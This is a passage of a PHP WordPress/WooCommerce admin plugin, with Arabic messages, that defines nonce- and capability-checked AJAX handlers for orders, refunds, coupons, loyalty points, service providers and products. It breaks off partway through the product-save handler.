    $postcode  = sanitize_text_field( $_POST['postcode'] ?? '' );
    $country   = sanitize_text_field( $_POST['country'] ?? '' );

    $order->set_shipping_address_1( $address_1 );
    $order->set_shipping_address_2( $address_2 );
    $order->set_shipping_city( $city );
    $order->set_shipping_state( $state );
    $order->set_shipping_postcode( $postcode );
    $order->set_shipping_country( $country );
    $order->save();

    wp_send_json_success( 'تم الحفظ' );
}

/* ========================================
 * AJAX — Add Order Note
 * ======================================== */
add_action( 'wp_ajax_yamamah_add_order_note', 'yamamah_ajax_add_order_note' );
function yamamah_ajax_add_order_note() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $order_id      = isset( $_POST['order_id'] ) ? absint( $_POST['order_id'] ) : 0;
    $note          = isset( $_POST['note'] ) ? sanitize_textarea_field( $_POST['note'] ) : '';
    $customer_note = isset( $_POST['customer_note'] ) && $_POST['customer_note'] === '1';

    if ( ! $order_id || empty( $note ) ) {
        wp_send_json_error( 'بيانات غير صالحة' );
    }

    $order = wc_get_order( $order_id );
    if ( ! $order ) {
        wp_send_json_error( 'الطلب غير موجود' );
    }

    $comment_id = $order->add_order_note( $note, $customer_note ? 1 : 0, true );

    $current_user = wp_get_current_user();
    wp_send_json_success( array(
        'comment_id' => $comment_id,
        'added_by'   => $current_user->display_name ?: $current_user->user_login,
        'date'       => current_time( 'Y-m-d H:i' ),
    ) );
}

/* ========================================
 * AJAX — Refund Order
 * ======================================== */
add_action( 'wp_ajax_yamamah_refund_order', 'yamamah_ajax_refund_order' );
function yamamah_ajax_refund_order() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $order_id = isset( $_POST['order_id'] ) ? absint( $_POST['order_id'] ) : 0;
    $amount   = isset( $_POST['amount'] ) ? floatval( $_POST['amount'] ) : 0;
    $reason   = isset( $_POST['reason'] ) ? sanitize_text_field( $_POST['reason'] ) : '';

    if ( ! $order_id || $amount <= 0 ) {
        wp_send_json_error( 'بيانات غير صالحة' );
    }

    $order = wc_get_order( $order_id );
    if ( ! $order ) {
        wp_send_json_error( 'الطلب غير موجود' );
    }

    $remaining = (float) $order->get_total() - (float) $order->get_total_refunded();
    if ( $amount > $remaining ) {
        wp_send_json_error( 'المبلغ أكبر من المتبقي (' . wc_price( $remaining ) . ')' );
    }

    $refund = wc_create_refund( array(
        'amount'   => $amount,
        'reason'   => $reason,
        'order_id' => $order_id,
    ) );

    if ( is_wp_error( $refund ) ) {
        wp_send_json_error( $refund->get_error_message() );
    }

    wp_send_json_success( 'تم الاسترداد بنجاح' );
}

/* ========================================
 * AJAX — Apply Coupon to Order
 * ======================================== */
add_action( 'wp_ajax_yamamah_apply_order_coupon', 'yamamah_ajax_apply_order_coupon' );
function yamamah_ajax_apply_order_coupon() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $order_id    = isset( $_POST['order_id'] ) ? absint( $_POST['order_id'] ) : 0;
    $coupon_code = isset( $_POST['coupon_code'] ) ? sanitize_text_field( $_POST['coupon_code'] ) : '';

    if ( ! $order_id || empty( $coupon_code ) ) {
        wp_send_json_error( 'بيانات غير صالحة' );
    }

    $order = wc_get_order( $order_id );
    if ( ! $order ) {
        wp_send_json_error( 'الطلب غير موجود' );
    }

    $coupon = new WC_Coupon( $coupon_code );
    if ( ! $coupon->get_id() ) {
        wp_send_json_error( 'كوبون غير موجود' );
    }

    $result = $order->apply_coupon( $coupon_code );
    if ( is_wp_error( $result ) ) {
        wp_send_json_error( $result->get_error_message() );
    }

    $order->calculate_totals();
    $order->save();

    wp_send_json_success( 'تم تطبيق الكوبون' );
}

/* ========================================
 * AJAX — Remove Coupon from Order
 * ======================================== */
add_action( 'wp_ajax_yamamah_remove_order_coupon', 'yamamah_ajax_remove_order_coupon' );
function yamamah_ajax_remove_order_coupon() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $order_id    = isset( $_POST['order_id'] ) ? absint( $_POST['order_id'] ) : 0;
    $coupon_code = isset( $_POST['coupon_code'] ) ? sanitize_text_field( $_POST['coupon_code'] ) : '';

    if ( ! $order_id || empty( $coupon_code ) ) {
        wp_send_json_error( 'بيانات غير صالحة' );
    }

    $order = wc_get_order( $order_id );
    if ( ! $order ) {
        wp_send_json_error( 'الطلب غير موجود' );
    }

    $order->remove_coupon( $coupon_code );
    $order->calculate_totals();
    $order->save();

    wp_send_json_success( 'تمت إزالة الكوبون' );
}

/* ========================================
 * AJAX — Toggle Loyalty Plugin
 * ======================================== */
add_action( 'wp_ajax_yamamah_toggle_loyalty', 'yamamah_ajax_toggle_loyalty' );
function yamamah_ajax_toggle_loyalty() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'activate_plugins' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }
    if ( function_exists( 'yamamah_plan_allows' ) && ! yamamah_plan_allows( 'loyalty_points' ) ) {
        wp_send_json_error( array( 'message' => 'نقاط الولاء غير متاحة في باقتك الحالية. قم بترقية الباقة لتفعيل هذه الميزة.' ) );
    }

    $activate    = isset( $_POST['activate'] ) && $_POST['activate'] === '1';
    $plugin_file = 'yaamama-points/yaamama-points.php';

    if ( $activate ) {
        $result = activate_plugin( $plugin_file );
        if ( is_wp_error( $result ) ) {
            wp_send_json_error( array( 'message' => $result->get_error_message() ) );
        }
    } else {
        deactivate_plugins( $plugin_file );
    }

    wp_send_json_success();
}

/* ========================================
 * AJAX — Save Loyalty Settings
 * ======================================== */
add_action( 'wp_ajax_yamamah_save_loyalty_settings', 'yamamah_ajax_save_loyalty_settings' );
function yamamah_ajax_save_loyalty_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $earn_rate          = max( 1, intval( $_POST['earn_rate'] ?? 10 ) );
    $point_value        = max( 0, floatval( $_POST['point_value'] ?? 0.5 ) );
    $max_redeem_percent = min( 100, max( 0, intval( $_POST['max_redeem_percent'] ?? 50 ) ) );
    $statuses           = isset( $_POST['statuses'] ) ? array_map( 'sanitize_text_field', (array) $_POST['statuses'] ) : array( 'completed' );

    update_option( 'lap_pts_settings', array(
        'earn_rate'          => $earn_rate,
        'point_value'        => $point_value,
        'max_redeem_percent' => $max_redeem_percent,
        'statuses_to_earn'   => $statuses,
    ) );

    wp_send_json_success();
}

/* ========================================
 * AJAX — Adjust Loyalty Points
 * ======================================== */
add_action( 'wp_ajax_yamamah_adjust_loyalty_points', 'yamamah_ajax_adjust_loyalty_points' );
function yamamah_ajax_adjust_loyalty_points() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $customer  = sanitize_text_field( $_POST['customer'] ?? '' );
    $operation = sanitize_text_field( $_POST['operation'] ?? 'add' );
    $points    = absint( $_POST['points'] ?? 0 );

    if ( ! $customer || ! $points ) {
        wp_send_json_error( array( 'message' => 'أدخل بيانات صحيحة' ) );
    }

    if ( is_numeric( $customer ) ) {
        $user = get_user_by( 'id', $customer );
    } else {
        $user = get_user_by( 'email', $customer );
    }

    if ( ! $user ) {
        wp_send_json_error( array( 'message' => 'العميل غير موجود' ) );
    }

    if ( $operation === 'sub' ) {
        $balance = max( 0, (int) get_user_meta( $user->ID, '_lap_pts_balance', true ) );
        if ( $points > $balance ) {
            wp_send_json_error( array( 'message' => 'الرصيد غير كافٍ. الرصيد الحالي: ' . $balance ) );
        }
        if ( function_exists( 'lap_pts_sub' ) ) {
            lap_pts_sub( $user->ID, $points );
        } else {
            update_user_meta( $user->ID, '_lap_pts_balance', max( 0, $balance - $points ) );
        }
        $msg = 'تم خصم ' . $points . ' نقطة من ' . $user->display_name;
    } else {
        if ( function_exists( 'lap_pts_add' ) ) {
            lap_pts_add( $user->ID, $points );
        } else {
            $balance = max( 0, (int) get_user_meta( $user->ID, '_lap_pts_balance', true ) );
            update_user_meta( $user->ID, '_lap_pts_balance', $balance + $points );
        }
        $msg = 'تم إضافة ' . $points . ' نقطة لـ ' . $user->display_name;
    }

    // Customer-facing notification (My Account → الإشعارات).
    $user_msg = ( $operation === 'sub' )
        ? sprintf( 'تم خصم %d نقطة من رصيدك.', $points )
        : sprintf( 'تمت إضافة %d نقطة جديدة إلى حسابك بنجاح!', $points );
    $notes = get_user_meta( $user->ID, 'yamamah_user_notifications', true );
    if ( ! is_array( $notes ) ) {
        $notes = get_user_meta( $user->ID, 'raghada_notifications', true );
    }
    if ( ! is_array( $notes ) ) {
        $notes = array();
    }
    array_unshift(
        $notes,
        array(
            'id'      => uniqid( 'pts_', true ),
            'title'   => 'نقاط الولاء',
            'text'    => $user_msg,
            'message' => $user_msg,
            'time'    => current_time( 'mysql' ),
            'date'    => current_time( 'mysql' ),
            'read'    => false,
            'type'    => 'loyalty_points',
        )
    );
    $notes = array_slice( $notes, 0, 50 );
    update_user_meta( $user->ID, 'yamamah_user_notifications', $notes );
    update_user_meta( $user->ID, 'raghada_notifications', $notes );

    wp_send_json_success( array( 'message' => $msg ) );
}

/* ========================================
 * AJAX — Create Coupon
 * ======================================== */
add_action( 'wp_ajax_yamamah_create_coupon', 'yamamah_ajax_create_coupon' );
function yamamah_ajax_create_coupon() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }
    if ( function_exists( 'yamamah_plan_allows' ) && ! yamamah_plan_allows( 'coupons' ) ) {
        wp_send_json_error( array( 'message' => 'القسائم غير متاحة في باقتك الحالية. قم بترقية الباقة لتفعيل هذه الميزة.' ) );
    }

    $code = sanitize_text_field( strtolower( trim( $_POST['code'] ?? '' ) ) );
    if ( ! $code ) {
        wp_send_json_error( array( 'message' => 'أدخل كود القسيمة' ) );
    }

    $existing = wc_get_coupon_id_by_code( $code );
    if ( $existing ) {
        wp_send_json_error( array( 'message' => 'كود القسيمة موجود مسبقاً' ) );
    }

    $coupon = new WC_Coupon();
    $coupon->set_code( $code );
    $coupon->set_discount_type( sanitize_text_field( $_POST['discount_type'] ?? 'percent' ) );
    $coupon->set_amount( floatval( $_POST['amount'] ?? 0 ) );

    if ( ! empty( $_POST['usage_limit'] ) ) {
        $coupon->set_usage_limit( absint( $_POST['usage_limit'] ) );
    }
    if ( ! empty( $_POST['usage_limit_per_user'] ) ) {
        $coupon->set_usage_limit_per_user( absint( $_POST['usage_limit_per_user'] ) );
    }
    if ( ! empty( $_POST['minimum_amount'] ) ) {
        $coupon->set_minimum_amount( floatval( $_POST['minimum_amount'] ) );
    }
    if ( ! empty( $_POST['expiry_date'] ) ) {
        $expiry_raw = sanitize_text_field( wp_unslash( $_POST['expiry_date'] ) );
        /* انتهاء بنهاية اليوم 23:59:59 وليس بداية اليوم. */
        if ( preg_match( '/^\d{4}-\d{2}-\d{2}$/', $expiry_raw ) ) {
            $expiry_raw .= ' 23:59:59';
        }
        $coupon->set_date_expires( $expiry_raw );
    }
    if ( ! empty( $_POST['free_shipping'] ) ) {
        $coupon->set_free_shipping( true );
    }
    if ( ! empty( $_POST['individual_use'] ) ) {
        $coupon->set_individual_use( true );
    }

    $coupon->save();
    wp_send_json_success( array( 'id' => $coupon->get_id() ) );
}

/* ========================================
 * AJAX — Delete Coupon
 * ======================================== */
add_action( 'wp_ajax_yamamah_delete_coupon', 'yamamah_ajax_delete_coupon' );
function yamamah_ajax_delete_coupon() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $coupon_id = absint( $_POST['coupon_id'] ?? 0 );
    if ( ! $coupon_id ) {
        wp_send_json_error( array( 'message' => 'معرف القسيمة مطلوب' ) );
    }

    wp_trash_post( $coupon_id );
    wp_send_json_success();
}

/* ========================================
 * AJAX — Bulk Products Action
 * ======================================== */
add_action( 'wp_ajax_yamamah_bulk_products', 'yamamah_ajax_bulk_products' );
function yamamah_ajax_bulk_products() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $ids    = isset( $_POST['product_ids'] ) ? array_map( 'absint', $_POST['product_ids'] ) : array();
    $action = isset( $_POST['bulk_action'] ) ? sanitize_text_field( $_POST['bulk_action'] ) : '';

    if ( empty( $ids ) || ! in_array( $action, array( 'publish', 'draft', 'trash' ), true ) ) {
        wp_send_json_error( 'بيانات غير صالحة' );
    }

    $done = 0;
    foreach ( $ids as $id ) {
        $post = get_post( $id );
        if ( ! $post || $post->post_type !== 'product' ) continue;

        if ( $action === 'trash' ) {
            wp_trash_post( $id );
        } else {
            wp_update_post( array( 'ID' => $id, 'post_status' => $action ) );
        }
        $done++;
    }

    wp_send_json_success( array( 'updated' => $done ) );
}

add_action( 'wp_ajax_yamamah_delete_product', 'yamamah_ajax_delete_product' );
function yamamah_ajax_delete_product() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );

    $product_id = absint( $_POST['product_id'] ?? 0 );
    if ( ! $product_id ) wp_send_json_error( 'معرف المنتج غير صالح' );

    $product = wc_get_product( $product_id );
    if ( ! $product ) wp_send_json_error( 'المنتج غير موجود' );

    $product->delete( true );
    wp_send_json_success();
}

/* ========================================
 * AJAX — مزودو الخدمة (service_provider)
 * ======================================== */

add_action( 'wp_ajax_yamamah_get_providers', 'yamamah_ajax_get_providers' );
function yamamah_ajax_get_providers() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $posts = get_posts(
        array(
            'post_type'      => 'service_provider',
            'posts_per_page' => -1,
            'post_status'    => array( 'publish', 'draft' ),
            'orderby'        => 'title',
            'order'          => 'ASC',
        )
    );

    $providers = array();
    foreach ( $posts as $post ) {
        $id  = (int) $post->ID;
        $row = function_exists( 'yamamah_provider_payload' ) ? yamamah_provider_payload( $id ) : null;
        if ( $row ) {
            $providers[] = $row;
        }
    }

    wp_send_json_success( array( 'providers' => $providers ) );
}

add_action( 'wp_ajax_yamamah_get_provider', 'yamamah_ajax_get_provider' );
function yamamah_ajax_get_provider() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $id = absint( $_POST['provider_id'] ?? 0 );
    if ( ! $id ) {
        wp_send_json_error( 'معرف غير صالح' );
    }

    $post = get_post( $id );
    if ( ! $post || $post->post_type !== 'service_provider' ) {
        wp_send_json_error( 'مزود الخدمة غير موجود' );
    }

    $payload = function_exists( 'yamamah_provider_payload' ) ? yamamah_provider_payload( $id ) : null;
    if ( ! $payload ) {
        wp_send_json_error( 'مزود الخدمة غير موجود' );
    }
    wp_send_json_success( $payload );
}

add_action( 'wp_ajax_yamamah_save_provider', 'yamamah_ajax_save_provider' );
function yamamah_ajax_save_provider() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $id   = absint( $_POST['provider_id'] ?? 0 );
    $name = sanitize_text_field( $_POST['name'] ?? '' );
    if ( '' === $name ) {
        wp_send_json_error( 'اسم مزود الخدمة مطلوب' );
    }

    $status = sanitize_text_field( $_POST['status'] ?? 'publish' );
    if ( ! in_array( $status, array( 'publish', 'draft' ), true ) ) {
        $status = 'publish';
    }

    $data = array(
        'post_title'   => $name,
        'post_content' => wp_kses_post( wp_unslash( $_POST['description'] ?? '' ) ),
        'post_status'  => $status,
        'post_type'    => 'service_provider',
    );

    if ( $id ) {
        $existing = get_post( $id );
        if ( ! $existing || $existing->post_type !== 'service_provider' ) {
            wp_send_json_error( 'مزود الخدمة غير موجود' );
        }
        $data['ID'] = $id;
        $result      = wp_update_post( $data, true );
    } else {
        $data['post_author'] = get_current_user_id();
        $result              = wp_insert_post( $data, true );
    }

    if ( is_wp_error( $result ) ) {
        wp_send_json_error( $result->get_error_message() );
    }

    $pid = (int) $result;
    $specialty = sanitize_text_field( wp_unslash( $_POST['specialty'] ?? '' ) );
    $email     = sanitize_email( wp_unslash( $_POST['email'] ?? '' ) );
    update_post_meta( $pid, '_provider_specialty', $specialty );
    update_post_meta( $pid, '_provider_phone', sanitize_text_field( wp_unslash( $_POST['phone'] ?? '' ) ) );
    update_post_meta( $pid, '_provider_email', $email );
    if ( $specialty !== '' && ! get_post_meta( $pid, '_securex_job_title', true ) ) {
        update_post_meta( $pid, '_securex_job_title', $specialty );
    }

    $image_id = absint( $_POST['image_id'] ?? 0 );
    yamamah_sync_workforce_provider_image( $pid, $image_id );

    $app_pass = (string) wp_unslash( $_POST['app_password'] ?? $_REQUEST['app_password'] ?? '' );
    $create_app = ! empty( $_POST['create_app_account'] ) || ! empty( $_REQUEST['create_app_account'] ) || $app_pass !== '';
    $existing_uid = (int) get_post_meta( $pid, '_provider_user_id', true );
    $app_user_id  = null;

    if ( $create_app || $existing_uid ) {
        if ( ! function_exists( 'yamamah_sync_provider_app_user' ) ) {
            wp_send_json_error( 'نسخة لوحة التحكم لا تدعم حساب تطبيق المزود. حدّث yamamah-dashboard على المتجر.' );
        }
        if ( ! $email ) {
            wp_send_json_error( 'البريد مطلوب لإنشاء حساب دخول المزود' );
        }
        // عند إنشاء حساب جديد: كلمة المرور إلزامية (لا نولّد عشوائية يخفيها النظام عن المدير).
        if ( ! $existing_uid && $app_pass === '' ) {
            wp_send_json_error( 'أدخل كلمة مرور لتسجيل دخول مزود الخدمة' );
        }
        $synced = yamamah_sync_provider_app_user( $pid, $email, $name, $app_pass );
        if ( is_wp_error( $synced ) ) {
            wp_send_json_error( $synced->get_error_message() );
        }
        $app_user_id = (int) $synced;
        if ( $app_user_id <= 0 ) {
            wp_send_json_error( 'تعذّر إنشاء حساب دخول المزود' );
        }
    }

    wp_send_json_success(
        array(
            'id'               => $pid,
            'has_app_account'  => (int) get_post_meta( $pid, '_provider_user_id', true ) > 0,
            'provider_user_id' => $app_user_id ?: ( (int) get_post_meta( $pid, '_provider_user_id', true ) ?: null ),
            'app_password_set' => $app_pass !== '',
        )
    );
}

add_action( 'wp_ajax_yamamah_delete_provider', 'yamamah_ajax_delete_provider' );
function yamamah_ajax_delete_provider() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $id = absint( $_POST['provider_id'] ?? 0 );
    if ( ! $id ) {
        wp_send_json_error( 'معرف غير صالح' );
    }

    $post = get_post( $id );
    if ( ! $post || $post->post_type !== 'service_provider' ) {
        wp_send_json_error( 'مزود الخدمة غير موجود' );
    }

    $deleted = wp_delete_post( $id, true );
    if ( false === $deleted || null === $deleted ) {
        wp_send_json_error( 'تعذر حذف مزود الخدمة' );
    }

    wp_send_json_success();
}

/* ========================================
 * AJAX — Products / Terms / Attributes
 * ======================================== */

add_action( 'wp_ajax_yamamah_get_product', 'yamamah_ajax_get_product' );
function yamamah_ajax_get_product() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $product_id = absint( $_POST['product_id'] ?? $_REQUEST['product_id'] ?? 0 );

    $simple_candidates = array();
    $simples           = wc_get_products(
        array(
            'type'    => 'simple',
            'status'  => array( 'publish' ),
            'limit'   => 200,
            'orderby' => 'title',
            'order'   => 'ASC',
            'return'  => 'objects',
        )
    );
    foreach ( $simples as $sp ) {
        if ( $product_id && (int) $sp->get_id() === $product_id ) {
            continue;
        }
        $simple_candidates[] = array(
            'id'   => (int) $sp->get_id(),
            'name' => $sp->get_name(),
        );
    }

    // product_id=0 → defaults + candidates (for create form / grouped picker)
    if ( ! $product_id ) {
        wp_send_json_success(
            array(
                'id'                => 0,
                'name'              => '',
                'product_type'      => 'simple',
                'status'            => 'publish',
                'manage_stock'      => 'no',
                'stock_status'      => 'instock',
                'deposit_enabled'   => '0',
                'deposit_type'      => 'percentage',
                'deposit_value'     => '',
                'grouped_ids'       => array(),
                'simple_candidates' => $simple_candidates,
            )
        );
    }

    $product = wc_get_product( $product_id );
    if ( ! $product ) {
        $labels = yamamah_get_catalog_labels();
        wp_send_json_error( $labels['not_found'] ?? 'غير موجود' );
    }

    $image_id  = (int) $product->get_image_id();
    $type      = $product->get_type();
    $sale_from = $product->get_date_on_sale_from();
    $sale_to   = $product->get_date_on_sale_to();

    $grouped_ids = array();
    if ( 'grouped' === $type && method_exists( $product, 'get_children' ) ) {
        $grouped_ids = array_map( 'absint', (array) $product->get_children() );
    }

    wp_send_json_success(
        array(
            'id'                => $product_id,
            'name'              => $product->get_name(),
            'short_desc'        => $product->get_short_description(),
            'desc'              => $product->get_description(),
            'slug'              => $product->get_slug(),
            'sku'               => $product->get_sku(),
            'status'            => $product->get_status(),
            'product_type'      => $type,
            'price'             => $product->get_regular_price(),
            'sale_price'        => $product->get_sale_price(),
            'sale_from'         => $sale_from ? $sale_from->date( 'Y-m-d' ) : '',
            'sale_to'           => $sale_to ? $sale_to->date( 'Y-m-d' ) : '',
            'manage_stock'      => $product->get_manage_stock() ? 'yes' : 'no',
            'stock'             => $product->get_stock_quantity(),
            'stock_status'      => $product->get_stock_status(),
            'backorders'        => $product->get_backorders(),
            'virtual'           => $product->get_virtual() ? '1' : '0',
            'image_id'          => $image_id,
            'image'             => $image_id ? (string) wp_get_attachment_image_url( $image_id, 'medium' ) : '',
            'cat_ids'           => array_map( 'absint', (array) $product->get_category_ids() ),
            'tag_ids'           => array_map( 'absint', (array) $product->get_tag_ids() ),
            'grouped_ids'       => $grouped_ids,
            'simple_candidates' => $simple_candidates,
            'deposit_enabled'   => get_post_meta( $product_id, '_deposit_enabled', true ) === 'yes' ? '1' : '0',
            'deposit_type'      => (string) ( get_post_meta( $product_id, '_deposit_type', true ) ?: 'percentage' ),
            'deposit_value'     => (string) get_post_meta( $product_id, '_deposit_value', true ),
            'late_fee_enabled'  => get_post_meta( $product_id, '_late_fee_enabled', true ) === 'yes' ? '1' : '0',
            'late_fee_type'     => (string) ( get_post_meta( $product_id, '_late_fee_type', true ) ?: 'fixed' ),
            'late_fee_value'    => (string) get_post_meta( $product_id, '_late_fee_value', true ),
            'insurance_enabled' => get_post_meta( $product_id, '_insurance_enabled', true ) === 'yes' ? '1' : '0',
            'insurance_amount'  => (string) get_post_meta( $product_id, '_insurance_amount', true ),
        )
    );
}

add_action( 'wp_ajax_yamamah_save_product', 'yamamah_ajax_save_product' );
function yamamah_ajax_save_product() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $product_id = absint( $_POST['product_id'] ?? 0 );
    $type       = sanitize_text_field( $_POST['product_type'] ?? 'simple' );
    $labels     = yamamah_get_catalog_labels();

    if ( ! $product_id && function_exists( 'yamamah_max_products' ) ) {
        $max = yamamah_max_products();
        // أقل من صفر = غير محدود (مثل -1 في yamama_plan_features / yamama_max_products).
        if ( $max >= 0 ) {
            $count = (int) wp_count_posts( 'product' )->publish + (int) wp_count_posts( 'product' )->draft;
            if ( $count >= $max ) {
                wp_send_json_error( sprintf( $labels['max_items_error'], $max ) );
            }
        }
    }

    if ( $product_id ) {
        $existing = wc_get_product( $product_id );
        if ( ! $existing ) wp_send_json_error( $labels['not_found'] );
        $old_type = $existing->get_type();
        if ( $old_type !== $type ) {
            $classmap = array(
                'simple'   => 'WC_Product_Simple',
                'grouped'  => 'WC_Product_Grouped',
                'variable' => 'WC_Product_Variable',
                'external' => 'WC_Product_External',
            );
            $cls = isset( $classmap[ $type ] ) ? $classmap[ $type ] : 'WC_Product_Simple';
            $product = new $cls( $product_id );
        } else {
            $product = $existing;
        }
    } else {
        switch ( $type ) {
            case 'grouped':  $product = new WC_Product_Grouped(); break;
            case 'variable': $product = new WC_Product_Variable(); break;
            case 'external': $product = new WC_Product_External(); break;
            default:         $product = new WC_Product_Simple(); break;
        }
    }

    $product->set_name( sanitize_text_field( $_POST['name'] ?? '' ) );
    $product->set_short_description( wp_kses_post( wp_unslash( $_POST['short_desc'] ?? '' ) ) );
    $product->set_description( wp_kses_post( wp_unslash( $_POST['desc'] ?? '' ) ) );
    $slug = sanitize_title( $_POST['slug'] ?? '' );
    if ( $slug ) $product->set_slug( $slug );
    $product->set_sku( sanitize_text_field( $_POST['sku'] ?? '' ) );
    $product->set_status( sanitize_text_field( $_POST['status'] ?? 'publish' ) );

    if ( $type !== 'grouped' && $type !== 'variable' ) {
        $product->set_regular_price( sanitize_text_field( $_POST['price'] ?? '' ) );
        $sale = sanitize_text_field( $_POST['sale_price'] ?? '' );
        $product->set_sale_price( $sale );
        $sale_from = sanitize_text_field( $_POST['sale_from'] ?? '' );
        $sale_to   = sanitize_text_field( $_POST['sale_to'] ?? '' );
        if ( $sale_from && $sale_to && strtotime( $sale_to ) < strtotime( $sale_from ) ) {
            wp_send_json_error( 'تاريخ نهاية التخفيض يجب أن يكون مساوياً أو لاحقاً لتاريخ بداية التخفيض' );
        }
        $product->set_date_on_sale_from( $sale_from ? $sale_from : null );
        /* انتهاء التخفيض بنهاية اليوم 23:59:59. */
        if ( $sale_to && preg_match( '/^\d{4}-\d{2}-\d{2}$/', $sale_to ) ) {
            $sale_to .= ' 23:59:59';
        }
        $product->set_date_on_sale_to( $sale_to ? $sale_to : null );
    }

    $manage = ( $_POST['manage_stock'] ?? 'no' ) === 'yes';
    $product->set_manage_stock( $manage );
    if ( $manage ) {
        $product->set_stock_quantity( absint( $_POST['stock'] ?? 0 ) );
        $product->set_backorders( sanitize_text_field( $_POST['backorders'] ?? 'no' ) );
    } else {
        $product->set_stock_status( sanitize_text_field( $_POST['stock_status'] ?? 'instock' ) );
    }

    $virtual = ! empty( $_POST['virtual'] ) && $_POST['virtual'] === '1';
    $downloadable = ! empty( $_POST['downloadable'] ) && $_POST['downloadable'] === '1';
    $product->set_virtual( $virtual );
    $product->set_downloadable( $downloadable );
    $product->set_purchase_note( sanitize_textarea_field( $_POST['purchase_note'] ?? '' ) );

    // Only update featured image when explicitly provided (mobile may omit).
    if ( array_key_exists( 'image_id', $_POST ) ) {
        $image_id = absint( $_POST['image_id'] );
        $product->set_image_id( $image_id ? $image_id : 0 );
    } else {
        $image_id = (int) $product->get_image_id();
    }

    if ( array_key_exists( 'gallery_ids', $_POST ) ) {
        $gallery_ids = array_map( 'absint', (array) $_POST['gallery_ids'] );
        $product->set_gallery_image_ids( array_filter( $gallery_ids ) );
    }

    if ( ! $virtual ) {
        $product->set_weight( sanitize_text_field( $_POST['weight'] ?? '' ) );
        $product->set_length( sanitize_text_field( $_POST['length'] ?? '' ) );
        $product->set_width( sanitize_text_field( $_POST['width'] ?? '' ) );
        $product->set_height( sanitize_text_field( $_POST['height'] ?? '' ) );
    }

    $cat_ids = yamamah_parse_posted_term_ids( $_POST['cat_ids'] ?? array() );
    $tag_ids = yamamah_parse_posted_term_ids( $_POST['tag_ids'] ?? array() );
    $product->set_category_ids( $cat_ids );
    $product->set_tag_ids( $tag_ids );

    $upsell_ids = array_map( 'absint', (array) ( $_POST['upsell_ids'] ?? array() ) );
    $cross_sell_ids = array_map( 'absint', (array) ( $_POST['cross_sell_ids'] ?? array() ) );
    $product->set_upsell_ids( array_filter( $upsell_ids ) );
    $product->set_cross_sell_ids( array_filter( $cross_sell_ids ) );

    if ( $type === 'external' && method_exists( $product, 'set_product_url' ) ) {
        $product->set_product_url( esc_url_raw( $_POST['external_url'] ?? '' ) );
        $product->set_button_text( sanitize_text_field( $_POST['external_btn'] ?? '' ) );
    }

    if ( $type === 'grouped' && method_exists( $product, 'set_children' ) ) {
        $grouped_ids = array_map( 'absint', (array) ( $_POST['grouped_ids'] ?? array() ) );
        $product->set_children( array_filter( $grouped_ids ) );
    }

    $raw_attrs = $_POST['attributes'] ?? array();
    if ( is_string( $raw_attrs ) ) {
        $raw_attrs = json_decode( stripslashes( $raw_attrs ), true );
    }
    if ( ! is_array( $raw_attrs ) ) {
        $raw_attrs = array();
    }

    if ( ! empty( $raw_attrs ) ) {
        $wc_attrs = array();
        $position = 0;
        foreach ( $raw_attrs as $ra ) {
            if ( ! is_array( $ra ) ) {
                continue;
            }
            $taxonomy = sanitize_text_field( $ra['taxonomy'] ?? '' );
            $term_ids = array_values( array_filter( array_map( 'absint', (array) ( $ra['term_ids'] ?? array() ) ) ) );
            if ( ! $taxonomy ) {
                continue;
            }

            // Ensure taxonomy attribute id resolves with or without pa_ prefix.
            $attr_id = wc_attribute_taxonomy_id_by_name( $taxonomy );
            if ( ! $attr_id && 0 === strpos( $taxonomy, 'pa_' ) ) {
                $attr_id = wc_attribute_taxonomy_id_by_name( substr( $taxonomy, 3 ) );
            }
            if ( $attr_id && 0 !== strpos( $taxonomy, 'pa_' ) ) {
                $taxonomy = wc_attribute_taxonomy_name( $taxonomy );
            }

